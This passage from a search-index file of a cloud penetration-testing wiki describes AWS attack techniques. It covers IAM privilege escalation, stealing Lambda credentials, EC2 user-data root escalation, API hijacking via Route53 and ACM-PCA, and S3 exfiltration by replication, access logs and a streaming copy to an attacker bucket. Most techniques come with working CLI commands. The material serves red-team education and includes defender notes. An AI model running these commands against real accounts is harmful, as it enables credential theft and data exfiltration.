</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputrolepolicy","title":"iam:PutRolePolicy","text":"<p>With access to the iam:PutRolePolicy permission, an adversary can create an inline policy for a role they have access to and give themselves administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputuserpermissionsboundary","title":"iam:PutUserPermissionsBoundary","text":"<p>With access to the iam:PutUserPermissionsBoundary permission, an adversary can update a permissions boundary attached to a user they have access to. This may increase the user's effective permissions if the permissions boundary was more restrictive than any of the role's identity-based policies. </p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputuserpolicy","title":"iam:PutUserPolicy","text":"<p>With access to the iam:PutUserPolicy permission, an adversary can create an inline policy for a user they have access to and give themselves administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamsetdefaultpolicyversion","title":"iam:SetDefaultPolicyVersion","text":"<p>With access to the iam:SetDefaultPolicyVersion permission, an adversary can revert a policy associated with their principal to a previous version. This is useful for scenarios in which a previous version of a policy had more access than the current version.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamupdateassumerolepolicy","title":"iam:UpdateAssumeRolePolicy","text":"<p>With access to the iam:UpdateAssumeRolePolicy permission, an adversary can modify the assume-role policy of a role, allowing them to assume it. This is useful to gain access to administrator roles, or other more privileged roles.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamupdateloginprofile","title":"iam:UpdateLoginProfile","text":"<p>With access to the iam:UpdateLoginProfile permission, an adversary can change the password of an IAM user. This would allow them to log into the console as that user.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctioncode","title":"lambda:UpdateFunctionCode","text":"<p>With access to the lambda:UpdateFunctionCode permission, an adversary can modify an existing Lambda function's code. This would allow them to gain access to the privileges of the associated IAM role the next time the function is executed.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctionconfiguration","title":"lambda:UpdateFunctionConfiguration","text":"<p>With access to the lambda:UpdateFunctionConfiguration permission, an adversary can modify an existing Lambda function's configuration to add a new Lambda Layer. This Layer would then override an existing library and allow an adversary to execute malicious code under the privilege of the role associated with the Lambda function.</p>"},{"location":"aws/exploitation/lambda-steal-iam-credentials/","title":"Steal IAM Credentials and Event Data from Lambda","text":"<ul> <li> <p> Technique seen in the wild</p> <p>Reference: Compromised Cloud Compute Credentials: Case Studies From the Wild</p> </li> </ul> <p>In Lambda, IAM credentials are passed into the function via environment variables. The benefit for the adversary is that these credentials can be leaked via file read vulnerabilities such as XML External Entity attacks or SSRF that allows the file protocol. This is because \"everything is a file\".</p> <p>IAM credentials can be accessed via reading <code>/proc/self/environ</code>.</p> <p></p> <p>Note</p> <p>In the event that /proc/self/environ is blocked by a WAF, check if you can read the environment variables of other processes. This can be done by reading /proc/#/environ where '#' is some number often between 1 and 20.</p> <p>In addition to IAM credentials, Lambda functions also have event data that is passed to the function when it is started. This data is made available to the function via the runtime interface. Unlike IAM credentials, this data is accessible over standard SSRF at <code>http://169.254.100.1:9001/2018-06-01/runtime/invocation/next</code>. Additionally the environment variable <code>AWS_LAMBDA_RUNTIME_API</code> stores the IP address and port of the runtime interface as well.</p> <p>This will include information about what invoked the Lambda function and may be valuable depending on the context.</p> <p>Note</p> <p>Unlike IAM credentials associated with EC2 instances, there is no GuardDuty alert for stolen Lambda credentials.</p>"},{"location":"aws/exploitation/local_ec2_priv_esc_through_user_data/","title":"EC2 Privilege Escalation Through User Data","text":"<p>If you've gained a foothold on an EC2 instance, use these these techniques to escalate privileges to root/System on the host.</p>"},{"location":"aws/exploitation/local_ec2_priv_esc_through_user_data/#ec2modifyinstanceattribute","title":"ec2:ModifyInstanceAttribute","text":"<ul> <li> <p> Required IAM Permissions</p> <ul> <li>ec2:ModifyInstanceAttribute</li> </ul> </li> <li> <p> Recommended but not Required IAM Permissions</p> <ul> <li>ec2:StartInstances</li> <li>ec2:DescribeInstances</li> <li>ec2:StopInstances</li> </ul> </li> </ul> <ul> <li> <p> Original Research</p> <p>aws_pwn:elevation by Daniel Grzelak</p> </li> </ul> <p>If an adversary has access to the modify-instance attribute permission they can leverage it to escalate to root/System on an EC2 instance.</p> <p>Usually, user data scripts are only run the first time the instance is started. </p> <p>One trick to bypass this limitation uses the <code>#cloud-boothook</code> directive, which instructs the instance to run the code on each boot.</p> <p>An alternative approach uses a special cloud-init <code>cloud-config</code> to prompt a run every time the instance restarts.</p> <p>To do this, first create a file in the following format.</p> <pre><code>Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\n**commands here**\n--//\n</code></pre> <p>Modify the <code>commands here</code> section to do whatever action you want. Setting a reverse shell, adding an ssh key to the default user, etc. are all good options.</p> <p>Once you've done that, convert the file to base64. Linux can do this with the following command.</p> <p><code>base64 file.txt &gt; file.b64.txt</code></p> <p>Windows can do this with the following command.</p> <p><code>certutil -encode file.txt tmp.b64 &amp;&amp; findstr /v /c:- tmp.b64 &gt; file.b64.txt</code></p> <p>Now that you've base64 encoded your payload, you will leverage the ec2:ModifyInstanceAttribute API call to change the user data of the target instance. </p> <p>Note</p> <p>The instance will need to be stopped to modify its user data. You'll either have to stop it yourself, or wait for something else to stop it.</p> <pre><code>aws ec2 modify-instance-attribute \\\n--instance-id=xxx \\\n--attribute userData \\\n--value file://file.b64.txt\n</code></pre> <p>With that change made, simply start the instance again and your command will be executed with root/System.</p>"},{"location":"aws/exploitation/local_ec2_priv_esc_through_user_data/#leverage-scripts-in-s3","title":"Leverage scripts in S3","text":"<p>A common pattern when using EC2 is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download and set a config, etc. Oftentimes the scripts and packages are pulled from S3 and this introduces an opportunity for a developer/ops person to make a mistake.</p> <p>If the IAM role is too permissive and allows the role to write to that location, an adversary can leverage this for privilege escalation. Additionally, if there is any other kind of misconfiguration on the bucket itself, or another role which has access gets compromised, an adversary can take advantage of this as well.</p> <p>Take the following user data script:</p> <pre><code>#!/bin/bash\naws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh\nchmod +x /root/start_script.sh\n/root/start_script.sh\n</code></pre> <p>On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.</p> <p>Note</p> <p>In addition to new instances being spun up or after a reboot, poisoning the scripts/applications can also effect EC2 instances in an Auto Scaling Group.</p>"},{"location":"aws/exploitation/orphaned_cloudfront_or_dns_takeover_via_s3/","title":"DNS and CloudFront Domain Takeover via Deleted S3 Buckets","text":"<ul> <li> <p> Additional Resources</p> <p>Discover Dangling Domains that point to your cloud assets to prevent subdomain takeover</p> </li> <li> <p> Tools mentioned in this article</p> <p>domain-protect: OWASP Domain Protect - prevent subdomain takeover.  </p> </li> </ul> <p>Utilizing various techniques for recon and enumeration, an attacker can discover orphaned Cloudfront distributions or DNS Records that are attempting to serve content from an S3 bucket that no longer exists. If an adversary finds one of these, they can create an S3 bucket in their own account and use it to serve malicious content. This content would then be distributed by the victim, and appear to be legitimate by an outside observer.</p> <p>Note</p> <p>Previously, calls to a CloudFront distribution backed by an S3 bucket that was deleted would result in a <code>NoSuchBucket</code> error. For example:</p> <pre><code>&lt;Error&gt;\n&lt;Code&gt;NoSuchBucket&lt;/Code&gt;\n&lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;\n&lt;BucketName&gt;hackingthe.cloud&lt;/BucketName&gt;\n&lt;RequestId&gt;68M9C1KTARF9FBYN&lt;/RequestId&gt;\n&lt;HostId&gt;RpbdvVU9AXidVVI/1zD+WTwYdVI5YMqQNJShmf6zJlztBVyINq8TtqbzWpThdi/LivlOWRVCPVs=&lt;/HostId&gt;\n&lt;/Error&gt;\n</code></pre> <p>This made it easy for attackers to identify the bucket name and quickly create their own to serve malicious content. As of late 2023, this behavior has been changed. Now CloudFront distributions pointing to deleted S3 buckets will return a <code>NotFound</code> error, and will not include the bucket name. This is a clear security improvement from AWS and makes it more difficult for an adversary to abuse.</p> <p>If an adversary can enumerate the deleted bucket name through other means they can perform the attack as normal.</p> <p>While there are a variety of ways in which this could be harmful, typically an adversary would serve JavaScript content that could be used to impact other parts of the domain. An adversary could use this to potentially steal browser cookies, perform actions as the user, and more.</p> <p>Tip</p> <p>Misconfigurations such as these are typically caused by poor hygiene in retiring cloud resources. Always be sure to delete DNS records first to potentially mitigate these issues. There are automated services out there that will automate the discovery of vulnerable domains/CloudFront distributions such as OWASP's domain-protect.</p>"},{"location":"aws/exploitation/route53_modification_privilege_escalation/","title":"AWS API Call Hijacking via ACM-PCA","text":"<ul> <li> <p> Required IAM Permissions</p> <ul> <li>route53:CreateHostedZone</li> <li>route53:ChangeResourceRecordSets</li> <li>acm-pca:IssueCertificate</li> <li>acm-pca:GetCertificate</li> </ul> </li> <li> <p> Recommended but not Required IAM Permissions</p> <ul> <li>route53:GetHostedZone</li> <li>route53:ListHostedZones</li> <li>acm-pca:ListCertificateAuthorities</li> <li>ec2:DescribeVpcs</li> </ul> </li> </ul> <ul> <li> <p> Original Research</p> <p>Hijacking AWS API calls by niebardzo</p> </li> </ul> <p>Note</p> <p>To perform this attack the target account must already have an AWS Certificate Manager Private Certificate Authority (AWS-PCA) setup in the account, and EC2 instances in the VPC(s) must have already imported the certificates to trust it. With this infrastructure in place, the following attack can be performed to intercept AWS API traffic.</p> <p>Assuming there is an AWS VPC with multiple cloud-native applications talking to each other and to AWS API. Since the communication between the microservices is often TLS encrypted there must be a private CA to issue the valid certificates for those services. If ACM-PCA is used for that and the adversary manages to get access to control both route53 and acm-pca private CA with the minimum set of permissions described above, it can hijack the application calls to AWS API taking over their IAM permissions.</p> <p>This is possible because:  </p> <ul> <li>AWS SDKs do not have Certificate Pinning</li> <li>Route53 allows creating Private Hosted Zone and DNS records for AWS APIs domain names</li> <li>Private CA in ACM-PCA cannot be restricted to signing only certificates for specific Common Names</li> </ul> <p>For example, Secrets Manager in us-east-1 could be re-routed by an adversary setting the secretsmanager.us-east-1.amazonaws.com domain to an IP controlled by the adversary. The following creates the private hosted zone for secretsmanager.us-east-1.amazonaws.com: <pre><code>aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=&lt;VPCId&gt;\n</code></pre></p> <p>Then set the A record for secretsmanager.us-east-1.amazonaws.com in this private hosted zone. Use the following POST body payload - mitm.json:</p> <pre><code>{\n  \"Comment\": \"&lt;anything&gt;\",\n  \"Changes\": [{\n    \"Action\": \"UPSERT\",\n    \"ResourceRecordSet\": {\n      \"Name\": \"secretsmanager.us-east-1.amazonaws.com\",\n      \"Type\": \"A\",\n      \"TTL\": 0,\n      \"ResourceRecords\": [{\"Value\": \"&lt;ip_of_adversary_instance_in_the_VPC&gt;\"}]\n    }\n  }]\n}\n</code></pre> <p>One set TTL to 0 to avoid DNS caching. Then, the advisory uses this payload to change-resource-record-sets: <pre><code>aws route53 change-resource-record-sets --hosted-zone-id &lt;id_returned_by_previous_API_call&gt; --change-batch file://mitm.json\n</code></pre></p> <p>Now, the adversary must generate the CSR and send it for signing to the ACM-PCA, CSR and private key can be generated with OpenSSL: <pre><code>openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr\n</code></pre></p> <p>For CN (Common Name), one must provide secretsmanager.us-east-1.amazonaws.com. Then one sends the CSR to acm-pca to issue the certificate: <pre><code>aws acm-pca issue-certificate --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\" --csr file://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type=\"DAYS\" --idempotency-token 1234\n</code></pre></p> <p>It returns the signed certificate ARN in the response. The next call is to fetch the certificate.</p> <pre><code>aws acm-pca get-certificate --certificate-arn \"&lt;cert_arn_from_previous_response&gt;\" --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\"\n</code></pre> <p>Once one got the signed certificate on the disk as cert.crt, the adversary starts the listener or 443/TCP and sniffs the calls to the secretsmanager.us-east-1.amazonaws.com <pre><code>sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v\n</code></pre></p> <p>The calls can be then forwarded to the Secrets Manager VPCE to for example GetSecretValue and get unauthorized access to the data. The same action can be done with any AWS API called from the VPC - S3, KMS, etc.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/","title":"Exfiltrating S3 Data with Bucket Replication Policies","text":"<ul> <li> <p> Additional Resources</p> <p>Data exfiltration with native AWS S3 features by Ben Leembnruggen</p> </li> </ul>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#introduction","title":"Introduction","text":"<p>S3 data replication provides the ability to copy objects to another bucket, which can be useful from an enterprise logging, integration or security perspective. This can be configure between buckets in the same account, or an unrelated account. Where this feature could be abused is where a malicious actor could input a replication policy to copy objects to an attacker controlled bucket. Objects will continue to be replicated for as long as the policy in place, applying to all future objects placed into the bucket. Using S3 batch operations, attackers can also replicate objects already in the bucket, making it a convenient method for extracting all current and future objects uploaded to the impacted bucket.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#required-configurations-and-permissions","title":"Required Configurations and Permissions","text":""},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#pre-requisites","title":"Pre-requisites","text":"<p>For bucket replication to be enabled, the following pre-requisites need to be in place:  </p> <ul> <li>The source bucket owner must have the source and destination AWS Regions enabled for their account. For the destination account, just the destination region needs to be enabled.  </li> <li>Both source and destination buckets must have versioning enabled.  </li> <li>If the source bucket has S3 Object Lock enabled, the destination buckets must also have S3 Object Lock enabled.  </li> </ul>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#iam-role","title":"IAM Role","text":"<p>Minimum Required IAM Permissions - Source Account </p> <ul> <li><code>iam:CreateRole</code> (creating a new role)  </li> <li><code>iam:CreatePolicy</code> &amp; <code>iam:AttachRolePolicy</code> (creating a new policy) or <code>iam:PutRolePolicy</code> (modifying an existing policy)  </li> <li><code>iam:UpdateAssumeRolePolicy</code> </li> </ul> <p>Like most things in AWS, the replication service requires a user supplied role to carry out the replication on your behalf.  To replicate all data (including existing objects), an example trust policy and permission set would look something like:</p> <p>Trust Policy <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Service\": [\n                    \"s3.amazonaws.com\",\n                    \"batchoperations.s3.amazonaws.com\"\n                ]\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre></p> <p>IAM Permissions <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:GetReplicationConfiguration\",\n                \"s3:ListBucket\",\n                \"s3:PutInventoryConfiguration\",\n                \"s3:InitiateReplication\"\n            ],\n            \"Resource\": \"*\"\n        },\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:GetObjectVersionForReplication\",\n                \"s3:GetObjectVersionAcl\",\n                \"s3:GetObjectVersionTagging\"\n            ],\n            \"Resource\": \"*\"\n        },\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:ReplicateObject\",\n                \"s3:ReplicateDelete\",\n                \"s3:ReplicateTags\"\n            ],\n            \"Resource\": \"*\"\n        },\n        {\n         \"Sid\": \"OnlyRequiredIfReplicatingEncryptedObjects\",\n         \"Effect\":\"Allow\",\n         \"Action\":[\n            \"kms:Decrypt\"\n         ],\n         \"Condition\":{\n            \"StringLike\":{\n               \"kms:EncryptionContext:aws:s3:arn\":[\n                  \"arn:aws:s3:::SOURCEBUCKET/*\"\n               ]\n            }\n         },\n         \"Resource\":[\n            \"KEY ID IN SOURCE ACCOUNT CURRENTLY ENCRYPTING OBJECTS\" \n         ]\n      },\n      {\n        \"Sid\": \"OnlyRequiredIfReplicatingEncryptedObjectsToo\",\n        \"Effect\":\"Allow\",\n         \"Action\":[\n            \"kms:Encrypt\"\n         ],\n         \"Condition\":{\n            \"StringLike\":{\n               \"kms:EncryptionContext:aws:s3:arn\":[\n                  \"arn:aws:s3:::DESTINATIONBUCKET/*\"\n               ]\n            }\n         },\n         \"Resource\":[\n            \"KEY ID IN DESTINATION ACCOUNT TO BE SPECIFIED IN REPLICATION POLICY\" \n         ]\n      }\n    ]\n}\n</code></pre></p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#kms-if-objects-are-encrypted","title":"KMS - If objects are encrypted","text":"<p>Minimum Required IAM Permissions - Source Account </p> <ul> <li><code>kms:PutKeyPolicy</code> </li> </ul> <p>Where a KMS policy is configured to only allow a subset of principals to access an encrypted S3 object, the key policy will need to be updated to allow the above replication role access to decrypt the S3 objects.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#attacker-account-configuration","title":"Attacker Account Configuration","text":"<p>Minimum Required IAM Permissions (Destination Account) </p> <ul> <li><code>s3:PutBucketPolicy</code> </li> <li><code>kms:CreateKey</code>, <code>kms:PutKeyPolicy</code> </li> <li><code>s3:PutBucketVersioning</code> </li> </ul> <p>In order for a bucket to receive logs from another account, it requires a bucket policy explicitly allowing the replication of objects across. An example of this policy is below.</p> <p>Destination Bucket Policy  <pre><code>{\n   \"Version\":\"2012-10-17\",\n   \"Id\":\"\",\n   \"Statement\":[\n      {\n         \"Sid\":\"Set permissions for objects\",\n         \"Effect\":\"Allow\",\n         \"Principal\":{\n            \"AWS\":\"arn:aws:iam::SOURCE_ACCOUNT_ID:role/S3_REPLICATION_ROLE\"\n         },\n         \"Action\":[\n            \"s3:ReplicateObject\", \n            \"s3:ReplicateDelete\"],\n         \"Resource\":\"arn:aws:s3:::DESTINATION_BUCKET/*\"\n      },\n      {\n         \"Sid\":\"Set permissions on bucket\",\n         \"Effect\":\"Allow\",\n         \"Principal\":{\n            \"AWS\":\"arn:aws:iam::SOURCE_ACCOUNT_ID:role/S3_REPLICATION_ROLE\"\n         },\n         \"Action\":[\n            \"s3:List*\", \n            \"s3:GetBucketVersioning\", \n            \"s3:PutBucketVersioning\"],\n         \"Resource\":\"arn:aws:s3:::DESTINATION_BUCKET\"\n      }\n   ]\n}\n</code></pre></p> <p>If the S3 objects in the source account are encrypted, a key must be created in the destination account to encrypt the objects on replication.  Additionally, a pre-requisite of bucket replication is that Bucket Versioning is enabled on the destination bucket.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#configuring-the-replication","title":"Configuring the replication","text":"<p>Minimum Required IAM Permissions - Source Account </p> <ul> <li><code>s3:PutBucketReplication</code> </li> <li><code>iam:PassRole</code> </li> <li><code>s3:CreateJob</code> &amp; <code>s3:UpdateJobStatus</code> (Creating and starting a S3 batch replication job)  </li> <li><code>s3:PutBucketVersioning</code> (Only if not already enabled)  </li> </ul> <p>The final step is to configure the replication between the source and destination buckets.  Depending on whether you use the CLI or console, the steps can change slightly.  The full process for both options is documented by AWS here. </p> <p>In line with the steps above, ensure that: - Specify your created S3 replication role - Replicate existing objects (Disabled by default) - Select Replicate KMS Encrypted objects if needed (Disabled by default)     - The Key ID should be the KMS key in the destination account.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#what-defenders-can-look-for","title":"What defenders can look for","text":"<ul> <li>Unknown <code>PutBucketReplication</code> or <code>JobCreated</code> events in the Cloudtrail Management trail. The <code>JobCreated</code> event is generated when an S3 Batch operation job has been created, indicating that all existing objects in a bucket are being replicated across, as opposed to only future S3 objects.</li> </ul> <ul> <li> <p>When an encrypted object is replicated, KMS <code>Decrypt</code>/<code>Encrypt</code> events will appear in a Cloudtrail Management trail, with a principalID and sts assumed role prefixed with 's3-replication'. These encryption events will reference a KMS key in another account - which may trigger certain data perimeter detections.</p> </li> <li> <p>Unknown <code>PutBucketVersioning</code> events (a pre-requisite of bucket replication) on existing S3 buckets, recorded by the Cloudtrail Management trail.</p> </li> </ul>"},{"location":"aws/exploitation/s3_server_access_logs/","title":"Data Exfiltration through S3 Server Access Logs","text":"<ul> <li> <p> Original Research</p> <p> <p>Cloud services as exfiltration mechanisms by Costas Kourmpoglou</p> </p> </li> </ul> <p>If we have control over an IAM identity that allows <code>s3:GetObject</code>, depending on the network access to the S3 service, we can use S3 server access logs to a bucket we control, and use it to exfiltrate data.</p> <p>With server access logging, every request to our S3 bucket will be logged to a separate logging bucket. This includes internal AWS requests, or requests made via the AWS console. Even if a request is denied, the payload that the request is carrying, will be sent to our logging bucket. We can then send <code>GetObject</code> requests to s3 buckets, that we don't have access to, but because we control the server access logs, we will still receive the data that we want to exfiltrate in the first place.  </p>"},{"location":"aws/exploitation/s3_server_access_logs/#how","title":"How","text":"<p>We'll create an S3 bucket, <code>AttackerBucket</code> in our account with server access logging. Let's name the logging bucket <code>AttackerBucketLogs</code>. With our data in hand <code>ExampleDataToExfiltrate</code>, we will send a <code>GetObject</code> request to our bucket, for example:</p> <p><code>aws s3api get-object --bucket AttackerBucket  --key ExampleDataToExfiltrate</code></p> <p>The request will be denied. However the attempt along with the other details, including our key <code>ExampleDatatoExfiltrate</code> - which is the data we're exfiltrating -  will arrive to our logging bucket <code>AttackerBucketLogs</code>.</p> <p>We'll receive the data in the default logging format:</p> <pre><code>[..] attackerbucket [\u2026] 8.8.8.8 \u2013 [\u2026] REST.GET.OBJECT ExampleDataToExfiltrate \"GET / ExampleDataToExfiltrate HTTP/1.1\" 403 AccessDenied 243 - 18 - \"-\" \"UserAgentAlsoHasData \" \u2013 [\u2026]\n</code></pre> <p>We're exfiltrating data, using the Key parameter of the request. There's a hard limit of 1024 bytes per Key, but other request fields can be used like User-Agent.</p>"},{"location":"aws/exploitation/s3_server_access_logs/#challenges","title":"Challenges","text":"<p>There are two challenges with this method:</p> <ol> <li> <p>If the network access to the S3 service takes place over a VPC endpoint, then the policy of the VPC endpoint would need to allow access to our bucket. The VPC endpoint will drop the request and will not forward it to the S3 service, if the policy doesn't allow it. The S3 service won't be able to generate logs, and we won't be able to exfiltrate data.</p> </li> <li> <p>The logs are not guaranteed to arrive in order. If you're splitting data across multiple requests, you'll need to figure out a mechanism to re-order the data correctly.  </p> </li> </ol> <p>For the general usecase where network access to the S3 service takes place over the internet, there is a 10-120 minute delay, in the log delivery.</p>"},{"location":"aws/exploitation/s3_streaming_copy/","title":"S3 Streaming Copy","text":"<p>Shout Out to Janardhan Prabhakara for showing me this all those years ago!</p> <p>Requirements: a shell, terminal session, command prompt, a victim's AWS Access Key or STS token, an attacker AWS key and bucket to land in a separate account.</p> <p>Why would anyone use this?</p> <p>In many environments AWS to AWS traffic is largely unfiltered and voluminous. As well, an attacker may find a key that can perform GetObject action on S3, but not PutObject. Or perhaphs, more likely, an attacker would like to hide their exfiltration commands. </p> <p>If an attacker lands a shell on an EC2 Instance of the victim, any issued aws commands will be coming from an expected/trusted network which is even less likely to be detected.  However, S3 Streaming Copy techniques can also be used from any terminal with aws-cli.</p> <p>When this attack is perfomed the S3 GetObject call is recorded in the VICTIM cloudtrail dataevents (if enabled, which is unlikley) But, the S3 PutObject call is recorded in the ATTACKER's cloudtrail.  The VICTIM cannot see the S3 PutObject side of the copy in AWS Cloudtrail.</p> <p>When using the aws-cli utilize the <code>--profile</code> to specify the IAM context profile from the .aws/credentials file.</p> <p>Step 1: setup an profile in .aws/credentials for the ATTACKER credentials. These are credentials from your attacker controlled account aka not the victims credentials <pre><code>[attacker]\naws_access_key_id = &lt;attacker_key_id&gt;\naws_secret_access_key = &lt;attacker_secret_key&gt;\n</code></pre></p> <p>Step 2: Create a profile for the VICTIM credentials.  These are the keys attained with access to the victim's AWS enviornment. </p> <p>Note</p> <p>This step is optional if using a shell on a VICTIM EC2, running an EC2 instance profile that has the permissions to test.</p> <pre><code>[victim]\naws_access_key_id = &lt;victim_key_id&gt;\naws_secret_access_key = &lt;victim_secret_key&gt;\n</code></pre> <p>Step 3: example: S3 Stream Copy command for a single file from cli <pre><code>aws s3 cp --profile victim s3://victim_bucket/juicy_data.txt - | (aws s3 cp --profile attacker  - s3://attacker_bucket/juicy_data.txt )\n</code></pre></p> <p>Step 3: example: S3 Stream Copy command for a single file from cli of an Ec2 instance using the Instance Profile <pre><code>aws s3 cp s3://victim_bucket/juicy_data.txt - | (aws s3 cp --profile attacker  - s3://attacker_bucket/juicy_data.txt )\n</code></pre></p> <p>Prevention: A known, but not very common, way to prevent this is by mandating S3 communication through a VPC Endpoint and applying a VPC Endpoint Policy that denies any request that does not match the principalOrgId.</p> <p>This is becoming more common with the popularity of Data Perimeter guardrails</p> <p>Note</p> <p>If this technique doesn't work, it is possible there is a VPC Endpoint policy is in place. Try making the ATTACKER destination bucket in another AWS Region as Cross-region calls typically do not traverse a VPC Endpoint.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/","title":"Misconfigured Resource-Based Policies","text":"<p>Resource-based policies are an often overlooked part of AWS security that can have significant implications. A resource-based policy is a type of policy that is attached directly to an AWS resource that describes what actions can be performed on it and by whom. </p> <p>For example, the following is a bucket policy (a type of resource-based policy) that would permit the <code>tester</code> user to list the contents of the <code>super-public-fun-bucket</code> S3 bucket.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowS3Listing\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::111111111111:user/tester\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::super-public-fun-bucket\"\n        }\n    ]\n}\n</code></pre> <p>Resource-based policies make it easy to share AWS resources across AWS accounts. They also, as a result, make it easy to unintentionally share resources. The common example of this is misconfigured S3 buckets which leak sensitive information. </p> <p>For a Penetration Tester or Red Teamer it is important to understand the intricacies of how resource-based policies work, and how they can be abused.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#the-principal-and-risks","title":"The \u201c*\u201d Principal and Risks","text":"<p>In a resource-based policy you must specify a \u201cprincipal\u201d. This is the entity who is allowed (or denied) the ability to perform the action. It is possible to specify \u201c*\u201d as a principal which means that all users will be able to act on it. This effectively makes the resource public and anyone can perform actions against it.</p> <p>For a real world example of this, a telecommunications company had the following bucket policy set.</p> <pre><code>{\n  \"Sid\": \"AllowPublicRead\",\n  \"Effect\": \"Allow\",\n  \"Principal\": {\n    \"AWS\": \"*\"\n  },\n  \"Action\": [\n    \"s3:GetObject\",\n    \"s3:PutObject\"\n  ],\n  \"Resource\": \"arn:aws:s3:::media.tellacom.com/taskrouter/*\"\n}\n</code></pre> <p>The bucket this policy was attached to was used to distribute a JavaScript SDK, which would be a valid use-case for a public S3 bucket. As can be seen from the <code>Action</code> statement, the policy permitted both <code>s3:GetObject</code> and <code>s3:PutObject</code>. This enabled an attacker to overwrite the JavaScript SDK sitting in the bucket with malicious code. This code was then distributed from the legitimate bucket.</p> <p>While resource-based policy misconfigurations are often associated with leaking information (read), it is equally as dangerous that an adversary could modify (write to) the resource(s).</p> <p>Note</p> <p>Condition operators can be used to scope down the policy. For example, the principal can be set to \u201c*\u201d but the conditions can enforce which account can perform an action. It is important to thoroughly read the policy and understand the context before creating a finding for it. </p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#more-than-just-s3-buckets","title":"More Than Just S3 Buckets","text":"<p>It is worth noting that there are many different AWS services/resources which make use of resource-based policies. Each service will have its own security implications based on what the principal is and what the actions are. </p> <p>Note</p> <p>Prowler, an AWS assessment tool, can be used to quickly audit resource policies in an AWS account. Be mindful that it cannot contextualize all condition operators, and how they affect the account\u2019s security.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#dumping-and-analyzing-resource-based-policies-at-scale","title":"Dumping and analyzing resource-based policies at scale","text":"<p>You can download a copy of all resource-based policies configured in an account and run security linting checks against them using the aws-lint-iam-policies tool. It performs linting checks using the AWS IAM Access Analyzer policy validation feature, which also brings along a list of security-focused checks. </p> <p>Example invocation: <pre><code>python aws_lint_iam_policies.py --scope ACCOUNT --dump-policies\n</code></pre></p> <p>Instead of analyzing a single AWS account, the tool can also target all accounts of an AWS Organization.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#resource-based-policy-evaluation-logic","title":"Resource-Based Policy Evaluation Logic","text":"<p>It is important to note that resource-based policies have a unique quirk when it comes to policy evaluation logic. From the documentation, \u201cDepending on the type of principal, an Allow in a resource-based policy can result in a final decision of Allow, even if an implicit deny in an identity-based policy, permissions boundary, or session policy is present [within the same account]\u201d.</p> <p>Note</p> <p>An <code>implicit</code> deny is when there is no specific <code>Deny</code> statement, but there is also no <code>Allow</code> statement in a policy. You can think of an implicit deny as the starting point of a policy. Everything is denied by default and access has to be granted.</p> <p>An <code>explicit</code> deny is when there is a specific <code>Deny</code> statement in a policy. </p> <p>More information can be found in the documentation for the difference between explicit and implicit denies.</p> <p>This means that if there is an <code>Allow</code> in a resource policy, that entity can perform actions on the resource without an associated identity policy. Take the following SNS topic access policy (a form of resource-based policy) for example:</p> <p><pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": 